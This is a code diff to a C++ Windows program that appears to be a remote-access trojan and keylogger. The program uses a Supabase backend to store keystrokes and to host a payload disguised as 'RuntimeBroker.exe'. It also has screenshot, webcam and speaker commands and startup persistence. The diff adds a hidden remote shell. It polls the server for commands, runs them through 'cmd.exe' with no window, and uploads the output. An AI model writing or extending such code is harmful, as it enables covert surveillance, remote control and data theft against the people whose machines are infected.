@@ -32,6 +32,7 @@ ISampleGrabber : public IUnknown {
 
 #define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
 #define SUPABASE_CONTROL_PATH L"/rest/v1/control"
+#define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
 #define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
 #define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"
 
@@ -747,6 +748,97 @@ static bool UploadToStorage(const std::string& localPath, const std::string& sto
     return ok;
 }
 
+static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = NULL) {
+    std::string result;
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    HANDLE hStdOutRd, hStdOutWr;
+    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0)) { if (outExitCode) *outExitCode = -1; return ""; }
+    SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
+    PROCESS_INFORMATION pi = {0};
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = hStdOutWr;
+    si.hStdError = hStdOutWr;
+    std::string cmdLine = "cmd.exe /c " + cmd;
+    if (!CreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(hStdOutWr); CloseHandle(hStdOutRd);
+        if (outExitCode) *outExitCode = -1;
+        return "";
+    }
+    CloseHandle(hStdOutWr);
+    DWORD startTime = GetTickCount();
+    char buf[4096];
+    while (true) {
+        DWORD avail = 0;
+        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
+        if (avail > 0) {
+            DWORD read = 0;
+            DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
+            if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
+                buf[read] = 0;
+                result += buf;
+                if (result.size() > 32000) { result = result.substr(0, 32000); result += "...[truncated]"; break; }
+            }
+        }
+        DWORD waitResult = WaitForSingleObject(pi.hProcess, 200);
+        if (waitResult == WAIT_OBJECT_0) break;
+        if (waitResult == WAIT_TIMEOUT && GetTickCount() - startTime > 60000) {
+            TerminateProcess(pi.hProcess, 1);
+            result += "\n[timed out after 60s]";
+            break;
+        }
+    }
+    while (true) {
+        DWORD avail = 0;
+        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
+        if (avail == 0) break;
+        DWORD read = 0;
+        DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
+        if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
+            buf[read] = 0;
+            result += buf;
+            if (result.size() > 32000) break;
+        }
+    }
+    CloseHandle(hStdOutRd);
+    DWORD exitCode = -1;
+    GetExitCodeProcess(pi.hProcess, &exitCode);
+    if (outExitCode) *outExitCode = exitCode;
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    return result;
+}
+
+static void CheckAndHandleExec() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.exec&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    if (resp.size() < 10 || resp.find("\"payload\":\"") == std::string::npos) return;
+    size_t idPos = resp.find("\"id\":");
+    if (idPos == std::string::npos) return;
+    idPos += 5;
+    size_t idEnd = resp.find_first_of("},]", idPos);
+    if (idEnd == std::string::npos) return;
+    std::string rowId = resp.substr(idPos, idEnd - idPos);
+    size_t payPos = resp.find("\"payload\":\"", idEnd);
+    if (payPos == std::string::npos) return;
+    payPos += 11;
+    size_t payEnd = resp.find("\"", payPos);
+    if (payEnd == std::string::npos) return;
+    std::string payload = resp.substr(payPos, payEnd - payPos);
+    DWORD exitCode = 0;
+    std::string output = ExecuteCommand(payload, &exitCode);
+    if (output.empty()) output = "(no output)";
+    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"" + EscapeJSON(payload) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
+    json = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("Exec: " + payload + " -> exit " + std::to_string((int)exitCode));
+}
+
 static std::string CheckScreenshotCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1160,6 +1252,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 if (!wcRowId.empty()) HandleWebcam(wcRowId);
                 std::string spRowId = CheckSpeakerCmd();
                 if (!spRowId.empty()) HandleSpeaker(spRowId);
+                CheckAndHandleExec();
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
